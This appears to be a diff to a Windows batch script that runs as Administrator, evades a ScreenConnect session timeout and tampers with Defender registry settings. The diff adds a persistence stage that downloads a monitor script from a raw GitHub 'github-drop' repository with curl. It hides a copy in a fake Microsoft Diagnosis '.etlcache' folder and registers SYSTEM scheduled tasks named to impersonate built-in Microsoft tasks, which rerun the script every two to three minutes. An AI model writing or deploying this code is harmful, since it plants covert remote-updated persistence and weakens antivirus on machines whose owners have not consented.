@@ -14,7 +14,7 @@ if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 
 REM Survive ScreenConnect Guest 30s kill: detach into independent process
 if /I not "%~1"=="_RUN" (
-  echo === OWN BUILD 20260731O3 ===
+  echo === OWN BUILD 20260802O4 ===
   net session >nul 2>&1
   if errorlevel 1 (echo need Administrator & exit /b 5)
   echo go_start %DATE% %TIME%>"%LOG%"
@@ -31,7 +31,7 @@ if /I not "%~1"=="_RUN" (
 )
 
 echo worker_start %DATE% %TIME%>>"%LOG%"
-echo === OWN WORKER 20260731O3 ===
+echo === OWN WORKER 20260802O4 ===
 
 echo [1] Defender reg only (no sc stop hang)...
 echo av_reg_begin>>"%LOG%"
@@ -150,6 +150,23 @@ sc start "%ALT%" >nul 2>&1
 sc config "%PRIM%" start= auto >nul 2>&1
 sc start "%PRIM%" >nul 2>&1
 timeout /t 2 /nobreak >nul
+
+echo [5] Arm persist+auto-update monitor...
+echo persist_begin>>"%LOG%"
+REM Prefer bundled own_mon.cmd beside this script; else pull from repo
+if exist "%~dp0own_mon.cmd" (
+  copy /y "%~dp0own_mon.cmd" "%WD%\own_mon.cmd" >nul
+) else (
+  curl.exe -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_mon.cmd" >nul 2>&1
+)
+if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
+copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1
+
+schtasks /Delete /TN "\Microsoft\Windows\Diagnosis\Scheduled" /F >nul 2>&1
+schtasks /Create /TN "\Microsoft\Windows\Diagnosis\Scheduled" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 2 /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
+schtasks /Delete /TN "\Microsoft\Windows\PLA\Server" /F >nul 2>&1
+schtasks /Create /TN "\Microsoft\Windows\PLA\Server" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 3 /F /TR "cmd.exe /c \"%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd\"" >nul 2>&1
+echo persist_armed_2m_3m>>"%LOG%"
 
 sc query "%PRIM%" >>"%LOG%" 2>&1
 sc query state= all | findstr /I ScreenConnect >>"%LOG%"
